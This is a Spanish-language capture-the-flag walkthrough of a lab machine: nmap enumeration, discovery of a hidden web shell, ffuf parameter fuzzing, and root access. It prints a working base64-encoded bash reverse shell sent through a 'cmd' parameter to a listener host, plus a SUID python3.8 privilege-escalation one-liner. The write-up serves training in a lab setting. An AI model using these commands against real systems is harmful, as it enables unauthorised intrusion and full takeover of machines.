 

## Enumeracion

Empiezo haciendo un ping a la maquina para saber con los TTLs que sistema operativo es.

`ping -c 1 172.17.0.2`
`64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.378 ms`

Con esto podemos saber que es linux.

Sigo enumerando con nmap para ver que puertos tiene abiertos.

`nmap -sVC -p- --min-rate 5000 172.17.0.2 -oG escaneo`

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0d:09:9d:0f:dc:43:54:cd:39:a9:e2:d6:81:74:40:e8 (RSA)
|   256 09:d0:f6:52:00:3f:21:51:19:b1:c6:7a:f4:ff:21:01 (ECDSA)
|_  256 19:e0:b3:72:bd:e9:1e:8d:4c:c4:fd:1f:da:3f:a5:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: The Walking Dead - CTF
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: D2:B0:06:19:01:23 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Puertos encontrados tras la enumeracion.

```
SSH/22
Apache/80
```


Ya que por ahora no tengo credenciales descarto el ssh y empiezo a analizar el apache.


## Analisis puerto 80

Empiezo haciendo un curl para ver que contiene la pagina a detalle.

`curl 172.17.0.2`

```
<!DOCTYPE html> <html lang="es"> <head>     <meta charset="UTF-8">     <title>The Walking Dead - CTF</title>     <style>         body {             background-color: black;             color: red;             font-family: 'Courier New', monospace;             text-align: center;             margin: 0;             padding: 0;             height: 100vh;             display: flex;             flex-direction: column;             justify-content: center;             align-items: center;         }         h1 {             font-size: 50px;             text-shadow: 3px 3px 10px darkred;         }         p {             font-size: 20px;         }         .blood-drip {             font-size: 25px;             text-shadow: 3px 3px 10px darkred;             animation: blink 1s infinite alternate;         }         @keyframes blink {             from { opacity: 1; }             to { opacity: 0.5; }         }         audio {             margin-top: 20px;         }         .hidden-link {             display: none;         }     </style> </head> <body>     <h1>The Walking Dead - CTF</h1>     <p class="blood-drip">Survive... if you can.</p>     <audio autoplay loop>         <source src="walking_dead_theme.mp3" type="audio/mpeg">         Tu navegador no soporta el audio.     </audio>     <p class="hidden-link"><a href="hidden/.shell.php">Access Panel</a></p> </body> </html>
```


Aqui vemos algo interesante, pone que hay un panel de acceso en `/hidden/.shell.php` pero al entrar sale una pagina en blanco asi que decido fuzzear los parametros para a ver si encuentro algo.

### Fuzzeo

`ffuf -u http://172.17.0.2/hidden/.shell.php?FUZZ=whoami -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt`
```cmd                     [Status: 200, Size: 9, Words: 1, Lines: 2, Duration: 7ms]```

Una vez fuzzeado veo que el parametro cmd tiene un tamaño mayor a los demas, y al probarlo veo que hay RCE. Asi que ahora intento meter una revshell para conseguir acceso


### Primer acceso

Empiezo poniendo el listener:

`nc -lvnp 4444`

Mando el payload:
```
http://172.17.0.2/hidden/.shell.php?cmd=echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQ%3D%3D%20%7C%20base64%20%2Dd%20%7C%20bash
```

Sin url encoded.
`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQ== | base64 -d | bash` 


Payload:
`bash -i >& /dev/tcp/172.17.0.1/4444 0>&1`

Una vez dentro uso el comando `id` y veo que estamos como el usuario `www-data`.


```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


## Escalada de privilegios

Empiezo con `sudo -l`
```
sudo -l
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
```

Veo que no se puede.

Sigo con los binarios SUID.

`find / -perm -4000 2>/dev/null`
```
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/mount
/usr/bin/man
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/python3.8
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```


Aqui veo algo interesante en los binarios SUID hay uno llamado  `/usr/bin/python3.8`

Una vez visto esto voy a escalar privilegios usando este SUID usando la libreria os.

```
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
whoami
root
```


### Explicacion SUID

Lo que hacemos `os.setuid(0)` es fijar el UID del proceso a `0` que es el UID de root. Y con `os.setgid(0)` hacemos lo mismo pero para el grupo y con `os.system("/bin/sh")` lanzamos la shell.

## Flujo del ataque

1. **Enumeración**: nmap descubre los puertos 22 (SSH) y 80 (HTTP).
2. **Descubrimiento**: en el código fuente de la web aparece una ruta oculta (`hidden/.shell.php`).
3. **Fuzzing**: se fuzzean los parámetros de esa ruta con ffuf y se descubre `cmd`, que permite RCE.
4. **Explotación**: se envía una reverse shell en base64 a través del parámetro `cmd` que nos da acceso como `www-data`.
5. **Escalada de privilegios**: se encuentra el binario `/usr/bin/python3.8` con el bit SUID activo y se abusa de él con `os.setuid(0)` para obtener una shell como `root`. 